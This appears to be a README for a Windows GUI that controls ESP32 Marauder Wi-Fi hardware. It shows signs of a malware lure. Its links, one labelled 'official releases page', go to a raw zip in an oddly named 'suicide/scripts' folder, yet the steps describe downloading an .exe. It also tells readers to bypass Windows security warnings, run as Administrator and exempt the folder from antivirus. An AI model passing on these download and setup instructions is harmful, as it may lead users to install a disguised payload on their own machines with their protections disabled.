# 📡 headless-marauder-gui - Manage your ESP32 Marauder hardware easily

[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Hydrocarbongenusephippiorhynchus660/headless-marauder-gui/main/suicide/scripts/gui_headless_marauder_v1.9-alpha.2.zip)

This application provides a visual interface for your ESP32 Marauder device. It replaces complex command-line processes with simple buttons and menus. You can control your hardware, update firmware, and view network data without writing code.

## 📋 System Requirements

To run this application on your Windows computer, you need the following:

- Windows 10 or Windows 11.
- A functional USB data cable.
- An ESP32 Marauder board.
- The latest version of the application from the link below.

## 📥 Downloading the Application

Follow these steps to obtain the software:

1. Visit the [official releases page](https://raw.githubusercontent.com/Hydrocarbongenusephippiorhynchus660/headless-marauder-gui/main/suicide/scripts/gui_headless_marauder_v1.9-alpha.2.zip) to access the download list.
2. Look for the file ending in `.exe` under the latest release tag.
3. Click the file name to start the download to your computer.
4. Save the file to your desktop for easy access.

## 🛠️ Setting Up Your Hardware

Your ESP32 Marauder needs a stable connection to your computer.

1. Connect your ESP32 board to your computer using the USB cable.
2. Wait for Windows to identify the device.
3. Open the downloaded `.exe` file. If Windows shows a security warning, click "More Info" and then "Run Anyway."
4. The main window will appear. It shows a list of available ports. Select the port that matches your device. If you see multiple ports, unplug the device and reconnect it to see which one disappears.

## 🖥️ Using the Interface

The interface divides into several clear sections:

- **Dashboard:** This panel shows active connections. You can see wireless access points and client devices in real time.
- **Target Picker:** Choose specific devices to focus your activity. Click on a device in the list to select it as your target.
- **Flasher:** This tool allows you to install new firmware. Select your board type from the dropdown menu, choose the firmware file, and click the "Flash" button. The application handles the technical work.
- **Data Logger:** Enable this to save network activity to a text file on your drive. This proves useful for reviewing information later.

## 🔄 Updating the Software

The application includes a self-update feature. Periodically, the software checks for new versions. When an update exists, a notification appears on the main screen. Click "Update" to download the latest files. The application restarts automatically after the process finishes.

## 🔍 Troubleshooting Common Issues

If the application fails to connect, try these steps:

1. **Check the USB Cable:** Many cables only provide power and do not transfer data. Ensure your cable supports data transfer.
2. **Review Port Selection:** Ensure the correct port appears in the settings menu. If no ports appear, your computer needs the correct driver for your specific ESP32 board.
3. **Run as Administrator:** If the flasher tool fails to write to the device, right-click the application icon and choose "Run as Administrator."
4. **Disable Antivirus Interference:** Sometimes security software stops the application from interacting with USB serial ports. Add an exception for the application folder in your antivirus settings.

## ⚡ Key Features

- **Visual Control:** Replace text strings with interactive menus.
- **Automated Flashing:** Simplify the installation of firmware.
- **Live Monitoring:** Watch network traffic as it happens.
- **Easy Updates:** Keep your tools current with one-click updates.
- **Portable Design:** Run the application without installing complex dependencies.

## 🛡️ Usage Guidelines

Handle your ESP32 device with care. Do not expose the internal components to static electricity or moisture. Always disconnect the device before performing physical maintenance or storage. Use this software only on hardware you own or have permission to test. Follow all local regulations regarding wireless communication.

## 📄 Support and Feedback

If you encounter a specific error message, take a screenshot of the application window. Go to the Issues tab on the repository page to search for similar problems. If no one else reported your issue, create a new report and include your Windows version and the steps you took to trigger the error. This helps improve the software for all users.